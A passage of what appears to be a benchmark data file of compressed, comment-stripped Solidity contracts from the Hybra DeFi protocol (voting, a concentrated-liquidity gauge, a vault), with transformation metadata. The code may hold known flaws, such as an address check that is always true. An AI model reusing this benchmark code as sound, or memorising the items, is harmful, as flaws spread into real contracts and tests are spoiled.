_votes;\nemit Abstained(_tokenId, _votes);\n}\n}\ntotalWeight -= _totalWeight;\nusedWeights[_tokenId] = 0;\ndelete poolVote[_tokenId];\n}\nfunction poke(uint256 _tokenId) external nonReentrant {\nuint256 _timestamp = block.timestamp;\nif (_timestamp <= HybraTimeLibrary.epochVoteStart(_timestamp)){\nrevert(\"DW\");\n}\nrequire(IVotingEscrow(_ve).isApprovedOrOwner(msg.sender, _tokenId) || msg.sender == _ve, \"NAO||VE\");\naddress[] memory _poolVote = poolVote[_tokenId];\nuint256 _poolCnt = _poolVote.length;\nuint256[] memory _weights = new uint256[](_poolCnt);\nfor (uint256 i = 0; i < _poolCnt; i ++) {\n_weights[i] = votes[_tokenId][_poolVote[i]];\n}\n_vote(_tokenId, _poolVote, _weights);\n}\nfunction vote(uint256 _tokenId, address[] calldata _poolVote, uint256[] calldata _weights)\nexternal onlyNewEpoch(_tokenId) nonReentrant {\nrequire(IVotingEscrow(_ve).isApprovedOrOwner(msg.sender, _tokenId), \"NAO\");\nrequire(_poolVote.length == _weights.length, \"MISMATCH_LEN\");\nrequire(_poolVote.length <= maxVotingNum, \"EXCEEDS\");\nuint256 _timestamp = block.timestamp;\n_vote(_tokenId, _poolVote, _weights);\nlastVoted[_tokenId] = HybraTimeLibrary.epochStart(block.timestamp) + 1;\nlastVotedTimestamp[_tokenId] = block.timestamp;\n}\nfunction _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights) internal {\n_reset(_tokenId);\nuint256 _poolCnt = _poolVote.length;\nuint256 _weight = IVotingEscrow(_ve).balanceOfNFT(_tokenId);\nuint256 _totalVoteWeight = 0;\nuint256 _usedWeight = 0;\nfor (uint i = 0; i < _poolCnt; i++) {\nif(gaugeManager.isGaugeAliveForPool(_poolVote[i])) _totalVoteWeight += _weights[i];\n}\nfor (uint256 i = 0; i < _poolCnt; i++) {\naddress _pool = _poolVote[i];\nif (gaugeManager.isGaugeAliveForPool(_pool)) {\nuint256 _poolWeight = _weights[i] * _weight / _totalVoteWeight;\nrequire(votes[_tokenId][_pool] == 0, \"ZV\");\nrequire(_poolWeight != 0, \"ZV\");\npoolVote[_tokenId].push(_pool);\nweights[_pool] += _poolWeight;\nvotes[_tokenId][_pool] = _poolWeight;\naddress internal_bribe = gaugeManager.fetchInternalBribeFromPool(_pool);\naddress external_bribe = gaugeManager.fetchExternalBribeFromPool(_pool);\nIBribe(internal_bribe).deposit(uint256(_poolWeight), _tokenId);\nIBribe(external_bribe).deposit(uint256(_poolWeight), _tokenId);\n_usedWeight += _poolWeight;\nemit Voted(msg.sender, _tokenId, _poolWeight);\n}\n}\nif (_usedWeight > 0) IVotingEscrow(_ve).voting(_tokenId);\ntotalWeight += _usedWeight;\nusedWeights[_tokenId] = _usedWeight;\n}\nmodifier onlyNewEpoch(uint256 _tokenId) {\nif (HybraTimeLibrary.epochStart(block.timestamp) <= lastVoted[_tokenId]) revert(\"VOTED\");\nif (block.timestamp <= HybraTimeLibrary.epochVoteStart(block.timestamp)) revert(\"DW\");\n_;\n}\nfunction length() external view returns (uint256) {\nreturn gaugeManager.pools().length;\n}\nfunction poolVoteLength(uint256 tokenId) external view returns(uint256) {\nreturn poolVote[tokenId].length;\n}\nfunction setGaugeManager(address _gaugeManager) external VoterAdmin {\nrequire(_gaugeManager != address(0));\ngaugeManager = IGaugeManager(_gaugeManager);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 43,
        "mode": "compressed",
        "original_lines": 257,
        "transformed_lines": 171,
        "original_chars": 11659,
        "transformed_chars": 6802,
        "compression_ratio": 0.58
      },
      "error": null
    },
    {
      "original_id": "sn_gs_006",
      "transformed_id": "ss_l1_compressed_sn_gs_006",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.8.13;\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\nimport \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\nimport '../interfaces/IGaugeFactoryCL.sol';\nimport '../interfaces/IGaugeManager.sol';\nimport './interface/ICLPool.sol';\nimport './interface/ICLFactory.sol';\nimport './interface/INonfungiblePositionManager.sol';\nimport '../interfaces/IBribe.sol';\nimport '../interfaces/IRHYBR.sol';\nimport {HybraTimeLibrary} from \"../libraries/HybraTimeLibrary.sol\";\nimport {FullMath} from \"./libraries/FullMath.sol\";\nimport {FixedPoint128} from \"./libraries/FixedPoint128.sol\";\nimport '../interfaces/IRHYBR.sol';\ncontract GaugeCL is ReentrancyGuard, Ownable, IERC721Receiver {\nusing SafeERC20 for IERC20;\nusing EnumerableSet for EnumerableSet.UintSet;\nusing SafeCast for uint128;\nIERC20 public immutable rewardToken;\naddress public immutable rHYBR;\naddress public VE;\naddress public DISTRIBUTION;\naddress public internal_bribe;\naddress public external_bribe;\nuint256 public DURATION;\nuint256 internal _periodFinish;\nuint256 public rewardRate;\nICLPool public clPool;\naddress public poolAddress;\nINonfungiblePositionManager public nonfungiblePositionManager;\nbool public emergency;\nbool public immutable isForPair;\naddress immutable factory;\nmapping(uint256 => uint256) public rewardRateByEpoch;\nmapping(address => EnumerableSet.UintSet) internal _stakes;\nmapping(uint256 => uint256) public rewardGrowthInside;\nmapping(uint256 => uint256) public rewards;\nmapping(uint256 => uint256) public lastUpdateTime;\nevent RewardAdded(uint256 reward);\nevent Deposit(address indexed user, uint256 amount);\nevent Withdraw(address indexed user, uint256 amount);\nevent Harvest(address indexed user, uint256 reward);\nevent ClaimFees(address indexed from, uint256 claimed0, uint256 claimed1);\nevent EmergencyActivated(address indexed gauge, uint256 timestamp);\nevent EmergencyDeactivated(address indexed gauge, uint256 timestamp);\nconstructor(address _rewardToken, address _rHYBR, address _ve, address _pool, address _distribution, address _internal_bribe,\naddress _external_bribe, bool _isForPair, address nfpm, address _factory) {\nfactory = _factory;\nrewardToken = IERC20(_rewardToken);\nrHYBR = _rHYBR;\nVE = _ve;\npoolAddress = _pool;\nclPool = ICLPool(_pool);\nDISTRIBUTION = _distribution;\nDURATION = HybraTimeLibrary.WEEK;\ninternal_bribe = _internal_bribe;\nexternal_bribe = _external_bribe;\nisForPair = _isForPair;\nnonfungiblePositionManager = INonfungiblePositionManager(nfpm);\nemergency = false;\n}\nmodifier onlyDistribution() {\nrequire(msg.sender == DISTRIBUTION, \"Caller is not RewardsDistribution contract\");\n_;\n}\nmodifier isNotEmergency() {\nrequire(emergency == false, \"emergency\");\n_;\n}\nfunction _updateRewards(uint256 tokenId, int24 tickLower, int24 tickUpper) internal {\nif (lastUpdateTime[tokenId] == block.timestamp) return;\nclPool.updateRewardsGrowthGlobal();\nlastUpdateTime[tokenId] = block.timestamp;\nrewards[tokenId] += _earned(tokenId);\nrewardGrowthInside[tokenId] = clPool.getRewardGrowthInside(tickLower, tickUpper, 0);\n}\nfunction activateEmergencyMode() external onlyOwner {\nrequire(emergency == false, \"emergency\");\nemergency = true;\nemit EmergencyActivated(address(this), block.timestamp);\n}\nfunction stopEmergencyMode() external onlyOwner {\nrequire(emergency == true,\"emergency\");\nemergency = false;\nemit EmergencyDeactivated(address(this), block.timestamp);\n}\nfunction balanceOf(uint256 tokenId) external view returns (uint256) {\n(,,,,,,,uint128 liquidity,,,,) = nonfungiblePositionManager.positions(tokenId);\nreturn liquidity;\n}\nfunction _getPoolAddress(address token0, address token1, int24 tickSpacing) internal view returns (address) {\nreturn ICLFactory(nonfungiblePositionManager.factory()).getPool(token0, token1, tickSpacing);\n}\nfunction earned(uint256 tokenId) external view returns (uint256 reward) {\nrequire(_stakes[msg.sender].contains(tokenId), \"NA\");\nuint256 reward = _earned(tokenId);\nreturn (reward);\n}\nfunction _earned(uint256 tokenId) internal view returns (uint256) {\nuint256 lastUpdated = clPool.lastUpdated();\nuint256 timeDelta = block.timestamp - lastUpdated;\nuint256 rewardGrowthGlobalX128 = clPool.rewardGrowthGlobalX128();\nuint256 rewardReserve = clPool.rewardReserve();\nif (timeDelta != 0 && rewardReserve > 0 && clPool.stakedLiquidity() > 0) {\nuint256 reward = rewardRate * timeDelta;\nif (reward > rewardReserve) reward = rewardReserve;\nrewardGrowthGlobalX128 += FullMath.mulDiv(reward, FixedPoint128.Q128, clPool.stakedLiquidity());\n}\n(,,,,, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,) = nonfungiblePositionManager.positions(tokenId);\nuint256 rewardPerTokenInsideInitialX128 = rewardGrowthInside[tokenId];\nuint256 rewardPerTokenInsideX128 = clPool.getRewardGrowthInside(tickLower, tickUpper, rewardGrowthGlobalX128);\nuint256 claimable =\nFullMath.mulDiv(rewardPerTokenInsideX128 - rewardPerTokenInsideInitialX128, liquidity, FixedPoint128.Q128);\nreturn claimable;\n}\nfunction deposit(uint256 tokenId) external nonReentrant isNotEmergency {\n(,,address token0, address token1, int24 tickSpacing, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,) =\nnonfungiblePositionManager.positions(tokenId);\nrequire(liquidity > 0, \"Gauge: zero liquidity\");\naddress positionPool = _getPoolAddress(token0, token1, tickSpacing);\nrequire(positionPool == poolAddress, \"Pool mismatch: Position not for this gauge pool\");\nnonfungiblePositionManager.collect(INonfungiblePositionManager.CollectParams({\ntokenId: tokenId,\nrecipient: msg.sender,\namount0Max: type(uint128).max,\namount1Max: type(uint128).max\n}));\nnonfungiblePositionManager.safeTransferFrom(msg.sender, address(this), tokenId);\nclPool.stake(int128(liquidity), tickLower, tickUpper, true);\nuint256 rewardGrowth = clPool.getRewardGrowthInside(tickLower, tickUpper, 0);\nrewardGrowthInside[tokenId] = rewardGrowth;\nlastUpdateTime[tokenId] = block.timestamp;\n_stakes[msg.sender].add(tokenId);\nemit Deposit(msg.sender, tokenId);\n}\nfunction withdraw(uint256 tokenId, uint8 redeemType) external nonReentrant isNotEmergency {\nrequire(_stakes[msg.sender].contains(tokenId), \"NA\");\nnonfungiblePositionManager.collect(\nINonfungiblePositionManager.CollectParams({\ntokenId: tokenId,\nrecipient: msg.sender,\namount0Max: type(uint128).max,\namount1Max: type(uint128).max\n})\n);\n(,,,,, int24 tickLower, int24 tickUpper, uint128 liquidityToStake,,,,) = nonfungiblePositionManager.positions(tokenId);\n_getReward(tickLower, tickUpper, tokenId, msg.sender, redeemType);\nif (liquidityToStake != 0) {\nclPool.stake(-int128(liquidityToStake), tickLower, tickUpper, true);\n}\n_stakes[msg.sender].remove(tokenId);\nnonfungiblePositionManager.safeTransferFrom(address(this), msg.sender, tokenId);\nemit Withdraw(msg.sender, tokenId);\n}\nfunction getReward(uint256 tokenId, address account,uint8 redeemType ) public nonReentrant onlyDistribution {\nrequire(_stakes[account].contains(tokenId), \"NA\");\n(,,,,, int24 tickLower, int24 tickUpper,,,,,) = nonfungiblePositionManager.positions(tokenId);\n_getReward(tickLower, tickUpper, tokenId, account, redeemType);\n}\nfunction _getReward(int24 tickLower, int24 tickUpper, uint256 tokenId,address account, uint8 redeemType) internal {\n_updateRewards(tokenId, tickLower, tickUpper);\nuint256 rewardAmount = rewards[tokenId];\nif(rewardAmount > 0){\ndelete rewards[tokenId];\nrewardToken.safeApprove(rHYBR, rewardAmount);\nIRHYBR(rHYBR).depostionEmissionsToken(rewardAmount);\nIRHYBR(rHYBR).redeemFor(rewardAmount, redeemType, account);\n}\nemit Harvest(msg.sender, rewardAmount);\n}\nfunction notifyRewardAmount(address token, uint256 rewardAmount) external nonReentrant\nisNotEmergency onlyDistribution returns (uint256 currentRate) {\nrequire(token == address(rewardToken), \"Invalid reward token\");\nclPool.updateRewardsGrowthGlobal();\nuint256 epochTimeRemaining = HybraTimeLibrary.epochNext(block.timestamp) - block.timestamp;\nuint256 epochEndTimestamp = block.timestamp + epochTimeRemaining;\nuint256 totalRewardAmount = rewardAmount + clPool.rollover();\nif (block.timestamp >= _periodFinish) {\nrewardRate = rewardAmount / epochTimeRemaining;\nclPool.syncReward({\nrewardRate: rewardRate,\nrewardReserve: totalRewardAmount,\nperiodFinish: epochEndTimestamp\n});\n} else {\nuint256 pendingRewards = epochTimeRemaining * rewardRate;\nrewardRate = (rewardAmount + pendingRewards) / epochTimeRemaining;\nclPool.syncReward({\nrewardRate: rewardRate,\nrewardReserve: totalRewardAmount + pendingRewards,\nperiodFinish: epochEndTimestamp\n});\n}\nrewardRateByEpoch[HybraTimeLibrary.epochStart(block.timestamp)] = rewardRate;\nrewardToken.safeTransferFrom(DISTRIBUTION, address(this), rewardAmount);\nuint256 contractBalance = rewardToken.balanceOf(address(this));\nrequire(rewardRate <= contractBalance / epochTimeRemaining, \"Insufficient balance for reward rate\");\n_periodFinish = epochEndTimestamp;\ncurrentRate = rewardRate;\nemit RewardAdded(rewardAmount);\n}\nfunction gaugeBalances() external view returns (uint256 token0, uint256 token1){\n(token0, token1) = clPool.gaugeFees();\n}\nfunction claimFees() external nonReentrant returns (uint256 claimed0, uint256 claimed1) {\nreturn _claimFees();\n}\nfunction _claimFees() internal returns (uint256 claimed0, uint256 claimed1) {\nif (!isForPair) {\nreturn (0, 0);\n}\nclPool.collectFees();\naddress _token0 = clPool.token0();\naddress _token1 = clPool.token1();\nclaimed0 = IERC20(_token0).balanceOf(address(this));\nclaimed1 = IERC20(_token1).balanceOf(address(this));\nif (claimed0 > 0 || claimed1 > 0) {\nuint256 _fees0 = claimed0;\nuint256 _fees1 = claimed1;\nif (_fees0 > 0) {\nIERC20(_token0).safeApprove(internal_bribe, 0);\nIERC20(_token0).safeApprove(internal_bribe, _fees0);\nIBribe(internal_bribe).notifyRewardAmount(_token0, _fees0);\n}\nif (_fees1 > 0) {\nIERC20(_token1).safeApprove(internal_bribe, 0);\nIERC20(_token1).safeApprove(internal_bribe, _fees1);\nIBribe(internal_bribe).notifyRewardAmount(_token1, _fees1);\n}\nemit ClaimFees(msg.sender, claimed0, claimed1);\n}\n}\nfunction rewardForDuration() external view returns (uint256) {\nreturn rewardRate * DURATION;\n}\nfunction setInternalBribe(address _int) external onlyOwner {\nrequire(_int >= address(0), \"zero\");\ninternal_bribe = _int;\n}\nfunction _safeTransfer(address token,address to,uint256 value) internal {\nrequire(token.code.length > 0);\n(bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));\nrequire(success && (data.length == 0 || abi.decode(data, (bool))));\n}\nfunction onERC721Received(\naddress operator,\naddress from,\nuint256 tokenId,\nbytes calldata data\n) external pure override returns (bytes4) {\nreturn IERC721Receiver.onERC721Received.selector;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 81,
        "mode": "compressed",
        "original_lines": 360,
        "transformed_lines": 258,
        "original_chars": 14771,
        "transformed_chars": 10901,
        "compression_ratio": 0.74
      },
      "error": null
    },
    {
      "original_id": "sn_gs_007",
      "transformed_id": "ss_l1_compressed_sn_gs_007",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.8.13;\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\nimport \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\nimport '../interfaces/IGaugeFactoryCL.sol';\nimport '../interfaces/IGaugeManager.sol';\nimport './interface/ICLPool.sol';\nimport './interface/ICLFactory.sol';\nimport './interface/INonfungiblePositionManager.sol';\nimport '../interfaces/IBribe.sol';\nimport '../interfaces/IRHYBR.sol';\nimport {HybraTimeLibrary} from \"../libraries/HybraTimeLibrary.sol\";\nimport {FullMath} from \"./libraries/FullMath.sol\";\nimport {FixedPoint128} from \"./libraries/FixedPoint128.sol\";\nimport '../interfaces/IRHYBR.sol';\ncontract GaugeCL is ReentrancyGuard, Ownable, IERC721Receiver {\nusing SafeERC20 for IERC20;\nusing EnumerableSet for EnumerableSet.UintSet;\nusing SafeCast for uint128;\nIERC20 public immutable rewardToken;\naddress public immutable rHYBR;\naddress public VE;\naddress public DISTRIBUTION;\naddress public internal_bribe;\naddress public external_bribe;\nuint256 public DURATION;\nuint256 internal _periodFinish;\nuint256 public rewardRate;\nICLPool public clPool;\naddress public poolAddress;\nINonfungiblePositionManager public nonfungiblePositionManager;\nbool public emergency;\nbool public immutable isForPair;\naddress immutable factory;\nmapping(uint256 => uint256) public rewardRateByEpoch;\nmapping(address => EnumerableSet.UintSet) internal _stakes;\nmapping(uint256 => uint256) public rewardGrowthInside;\nmapping(uint256 => uint256) public rewards;\nmapping(uint256 => uint256) public lastUpdateTime;\nevent RewardAdded(uint256 reward);\nevent Deposit(address indexed user, uint256 amount);\nevent Withdraw(address indexed user, uint256 amount);\nevent Harvest(address indexed user, uint256 reward);\nevent ClaimFees(address indexed from, uint256 claimed0, uint256 claimed1);\nevent EmergencyActivated(address indexed gauge, uint256 timestamp);\nevent EmergencyDeactivated(address indexed gauge, uint256 timestamp);\nconstructor(address _rewardToken, address _rHYBR, address _ve, address _pool, address _distribution, address _internal_bribe,\naddress _external_bribe, bool _isForPair, address nfpm, address _factory) {\nfactory = _factory;\nrewardToken = IERC20(_rewardToken);\nrHYBR = _rHYBR;\nVE = _ve;\npoolAddress = _pool;\nclPool = ICLPool(_pool);\nDISTRIBUTION = _distribution;\nDURATION = HybraTimeLibrary.WEEK;\ninternal_bribe = _internal_bribe;\nexternal_bribe = _external_bribe;\nisForPair = _isForPair;\nnonfungiblePositionManager = INonfungiblePositionManager(nfpm);\nemergency = false;\n}\nmodifier onlyDistribution() {\nrequire(msg.sender == DISTRIBUTION, \"Caller is not RewardsDistribution contract\");\n_;\n}\nmodifier isNotEmergency() {\nrequire(emergency == false, \"emergency\");\n_;\n}\nfunction _updateRewards(uint256 tokenId, int24 tickLower, int24 tickUpper) internal {\nif (lastUpdateTime[tokenId] == block.timestamp) return;\nclPool.updateRewardsGrowthGlobal();\nlastUpdateTime[tokenId] = block.timestamp;\nrewards[tokenId] += _earned(tokenId);\nrewardGrowthInside[tokenId] = clPool.getRewardGrowthInside(tickLower, tickUpper, 0);\n}\nfunction activateEmergencyMode() external onlyOwner {\nrequire(emergency == false, \"emergency\");\nemergency = true;\nemit EmergencyActivated(address(this), block.timestamp);\n}\nfunction stopEmergencyMode() external onlyOwner {\nrequire(emergency == true,\"emergency\");\nemergency = false;\nemit EmergencyDeactivated(address(this), block.timestamp);\n}\nfunction balanceOf(uint256 tokenId) external view returns (uint256) {\n(,,,,,,,uint128 liquidity,,,,) = nonfungiblePositionManager.positions(tokenId);\nreturn liquidity;\n}\nfunction _getPoolAddress(address token0, address token1, int24 tickSpacing) internal view returns (address) {\nreturn ICLFactory(nonfungiblePositionManager.factory()).getPool(token0, token1, tickSpacing);\n}\nfunction earned(uint256 tokenId) external view returns (uint256 reward) {\nrequire(_stakes[msg.sender].contains(tokenId), \"NA\");\nuint256 reward = _earned(tokenId);\nreturn (reward);\n}\nfunction _earned(uint256 tokenId) internal view returns (uint256) {\nuint256 lastUpdated = clPool.lastUpdated();\nuint256 timeDelta = block.timestamp - lastUpdated;\nuint256 rewardGrowthGlobalX128 = clPool.rewardGrowthGlobalX128();\nuint256 rewardReserve = clPool.rewardReserve();\nif (timeDelta != 0 && rewardReserve > 0 && clPool.stakedLiquidity() > 0) {\nuint256 reward = rewardRate * timeDelta;\nif (reward > rewardReserve) reward = rewardReserve;\nrewardGrowthGlobalX128 += FullMath.mulDiv(reward, FixedPoint128.Q128, clPool.stakedLiquidity());\n}\n(,,,,, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,) = nonfungiblePositionManager.positions(tokenId);\nuint256 rewardPerTokenInsideInitialX128 = rewardGrowthInside[tokenId];\nuint256 rewardPerTokenInsideX128 = clPool.getRewardGrowthInside(tickLower, tickUpper, rewardGrowthGlobalX128);\nuint256 claimable =\nFullMath.mulDiv(rewardPerTokenInsideX128 - rewardPerTokenInsideInitialX128, liquidity, FixedPoint128.Q128);\nreturn claimable;\n}\nfunction deposit(uint256 tokenId) external nonReentrant isNotEmergency {\n(,,address token0, address token1, int24 tickSpacing, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,) =\nnonfungiblePositionManager.positions(tokenId);\nrequire(liquidity > 0, \"Gauge: zero liquidity\");\naddress positionPool = _getPoolAddress(token0, token1, tickSpacing);\nrequire(positionPool == poolAddress, \"Pool mismatch: Position not for this gauge pool\");\nnonfungiblePositionManager.collect(INonfungiblePositionManager.CollectParams({\ntokenId: tokenId,\nrecipient: msg.sender,\namount0Max: type(uint128).max,\namount1Max: type(uint128).max\n}));\nnonfungiblePositionManager.safeTransferFrom(msg.sender, address(this), tokenId);\nclPool.stake(int128(liquidity), tickLower, tickUpper, true);\nuint256 rewardGrowth = clPool.getRewardGrowthInside(tickLower, tickUpper, 0);\nrewardGrowthInside[tokenId] = rewardGrowth;\nlastUpdateTime[tokenId] = block.timestamp;\n_stakes[msg.sender].add(tokenId);\nemit Deposit(msg.sender, tokenId);\n}\nfunction withdraw(uint256 tokenId, uint8 redeemType) external nonReentrant isNotEmergency {\nrequire(_stakes[msg.sender].contains(tokenId), \"NA\");\nnonfungiblePositionManager.collect(\nINonfungiblePositionManager.CollectParams({\ntokenId: tokenId,\nrecipient: msg.sender,\namount0Max: type(uint128).max,\namount1Max: type(uint128).max\n})\n);\n(,,,,, int24 tickLower, int24 tickUpper, uint128 liquidityToStake,,,,) = nonfungiblePositionManager.positions(tokenId);\n_getReward(tickLower, tickUpper, tokenId, msg.sender, redeemType);\nif (liquidityToStake != 0) {\nclPool.stake(-int128(liquidityToStake), tickLower, tickUpper, true);\n}\n_stakes[msg.sender].remove(tokenId);\nnonfungiblePositionManager.safeTransferFrom(address(this), msg.sender, tokenId);\nemit Withdraw(msg.sender, tokenId);\n}\nfunction getReward(uint256 tokenId, address account,uint8 redeemType ) public nonReentrant onlyDistribution {\nrequire(_stakes[account].contains(tokenId), \"NA\");\n(,,,,, int24 tickLower, int24 tickUpper,,,,,) = nonfungiblePositionManager.positions(tokenId);\n_getReward(tickLower, tickUpper, tokenId, account, redeemType);\n}\nfunction _getReward(int24 tickLower, int24 tickUpper, uint256 tokenId,address account, uint8 redeemType) internal {\n_updateRewards(tokenId, tickLower, tickUpper);\nuint256 rewardAmount = rewards[tokenId];\nif(rewardAmount > 0){\ndelete rewards[tokenId];\nrewardToken.safeApprove(rHYBR, rewardAmount);\nIRHYBR(rHYBR).depostionEmissionsToken(rewardAmount);\nIRHYBR(rHYBR).redeemFor(rewardAmount, redeemType, account);\n}\nemit Harvest(msg.sender, rewardAmount);\n}\nfunction notifyRewardAmount(address token, uint256 rewardAmount) external nonReentrant\nisNotEmergency onlyDistribution returns (uint256 currentRate) {\nrequire(token == address(rewardToken), \"Invalid reward token\");\nclPool.updateRewardsGrowthGlobal();\nuint256 epochTimeRemaining = HybraTimeLibrary.epochNext(block.timestamp) - block.timestamp;\nuint256 epochEndTimestamp = block.timestamp + epochTimeRemaining;\nuint256 totalRewardAmount = rewardAmount + clPool.rollover();\nif (block.timestamp >= _periodFinish) {\nrewardRate = rewardAmount / epochTimeRemaining;\nclPool.syncReward({\nrewardRate: rewardRate,\nrewardReserve: totalRewardAmount,\nperiodFinish: epochEndTimestamp\n});\n} else {\nuint256 pendingRewards = epochTimeRemaining * rewardRate;\nrewardRate = (rewardAmount + pendingRewards) / epochTimeRemaining;\nclPool.syncReward({\nrewardRate: rewardRate,\nrewardReserve: totalRewardAmount + pendingRewards,\nperiodFinish: epochEndTimestamp\n});\n}\nrewardRateByEpoch[HybraTimeLibrary.epochStart(block.timestamp)] = rewardRate;\nrewardToken.safeTransferFrom(DISTRIBUTION, address(this), rewardAmount);\nuint256 contractBalance = rewardToken.balanceOf(address(this));\nrequire(rewardRate <= contractBalance / epochTimeRemaining, \"Insufficient balance for reward rate\");\n_periodFinish = epochEndTimestamp;\ncurrentRate = rewardRate;\nemit RewardAdded(rewardAmount);\n}\nfunction gaugeBalances() external view returns (uint256 token0, uint256 token1){\n(token0, token1) = clPool.gaugeFees();\n}\nfunction claimFees() external nonReentrant returns (uint256 claimed0, uint256 claimed1) {\nreturn _claimFees();\n}\nfunction _claimFees() internal returns (uint256 claimed0, uint256 claimed1) {\nif (!isForPair) {\nreturn (0, 0);\n}\nclPool.collectFees();\naddress _token0 = clPool.token0();\naddress _token1 = clPool.token1();\nclaimed0 = IERC20(_token0).balanceOf(address(this));\nclaimed1 = IERC20(_token1).balanceOf(address(this));\nif (claimed0 > 0 || claimed1 > 0) {\nuint256 _fees0 = claimed0;\nuint256 _fees1 = claimed1;\nif (_fees0 > 0) {\nIERC20(_token0).safeApprove(internal_bribe, 0);\nIERC20(_token0).safeApprove(internal_bribe, _fees0);\nIBribe(internal_bribe).notifyRewardAmount(_token0, _fees0);\n}\nif (_fees1 > 0) {\nIERC20(_token1).safeApprove(internal_bribe, 0);\nIERC20(_token1).safeApprove(internal_bribe, _fees1);\nIBribe(internal_bribe).notifyRewardAmount(_token1, _fees1);\n}\nemit ClaimFees(msg.sender, claimed0, claimed1);\n}\n}\nfunction rewardForDuration() external view returns (uint256) {\nreturn rewardRate * DURATION;\n}\nfunction setInternalBribe(address _int) external onlyOwner {\nrequire(_int >= address(0), \"zero\");\ninternal_bribe = _int;\n}\nfunction _safeTransfer(address token,address to,uint256 value) internal {\nrequire(token.code.length > 0);\n(bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));\nrequire(success && (data.length == 0 || abi.decode(data, (bool))));\n}\nfunction onERC721Received(\naddress operator,\naddress from,\nuint256 tokenId,\nbytes calldata data\n) external pure override returns (bytes4) {\nreturn IERC721Receiver.onERC721Received.selector;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 81,
        "mode": "compressed",
        "original_lines": 360,
        "transformed_lines": 258,
        "original_chars": 14771,
        "transformed_chars": 10901,
        "compression_ratio": 0.74
      },
      "error": null
    },
    {
      "original_id": "sn_gs_008",
      "transformed_id": "ss_l1_compressed_sn_gs_008",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.8.13;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"./interfaces/IVotingEscrow.sol\";\nimport \"./interfaces/IVoter.sol\";\nimport \"./interfaces/IBribe.sol\";\nimport \"./interfaces/IRewardsDistributor.sol\";\nimport \"./interfaces/IGaugeManager.sol\";\nimport \"./interfaces/ISwapper.sol\";\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\ncontract GrowthHYBR is ERC20, Ownable, ReentrancyGuard {\nusing SafeERC20 for IERC20;\nuint256 public transferLockPeriod = 24 hours;\nuint256 public constant MIN_LOCK_PERIOD = 1 minutes;\nuint256 public constant MAX_LOCK_PERIOD = 240 minutes;\nuint256 public head_not_withdraw_time = 1200;\nuint256 public tail_not_withdraw_time = 300;\nuint256 public withdrawFee = 100;\nuint256 public constant MIN_WITHDRAW_FEE = 10;\nuint256 public constant MAX_WITHDRAW_FEE = 1000;\nuint256 public constant BASIS = 10000;\naddress public Team;\nuint256 public rebase;\nuint256 public penalty;\nuint256 public votingYield;\nstruct UserLock {\nuint256 amount;\nuint256 unlockTime;\n}\nmapping(address => UserLock[]) public userLocks;\nmapping(address => uint256) public lockedBalance;\naddress public immutable HYBR;\naddress public immutable votingEscrow;\naddress public voter;\naddress public rewardsDistributor;\naddress public gaugeManager;\nuint256 public veTokenId;\naddress public operator;\nuint256 public lastVoteEpoch;\nuint256 public lastRebaseTime;\nuint256 public lastCompoundTime;\nISwapper public swapper;\nerror NOT_AUTHORIZED();\nevent Deposit(address indexed user, uint256 hybrAmount, uint256 sharesReceived);\nevent Withdraw(address indexed user, uint256 shares, uint256 hybrAmount, uint256 fee);\nevent Compound(uint256 rewards, uint256 newTotalLocked);\nevent PenaltyRewardReceived(uint256 amount);\nevent TransferLockPeriodUpdated(uint256 oldPeriod, uint256 newPeriod);\nevent SwapperUpdated(address indexed oldSwapper, address indexed newSwapper);\nevent VoterSet(address voter);\nevent EmergencyUnlock(address indexed user);\nevent AutoVotingEnabled(bool enabled);\nevent OperatorUpdated(address indexed oldOperator, address indexed newOperator);\nevent DefaultVotingStrategyUpdated(address[] pools, uint256[] weights);\nevent AutoVoteExecuted(uint256 epoch, address[] pools, uint256[] weights);\nconstructor(\naddress _HYBR,\naddress _votingEscrow\n) ERC20(\"Growth HYBR\", \"gHYBR\") {\nrequire(_HYBR != address(0), \"Invalid HYBR\");\nrequire(_votingEscrow != address(0), \"Invalid VE\");\nHYBR = _HYBR;\nvotingEscrow = _votingEscrow;\nlastRebaseTime = block.timestamp;\nlastCompoundTime = block.timestamp;\noperator = msg.sender;\n}\nfunction setRewardsDistributor(address _rewardsDistributor) external onlyOwner 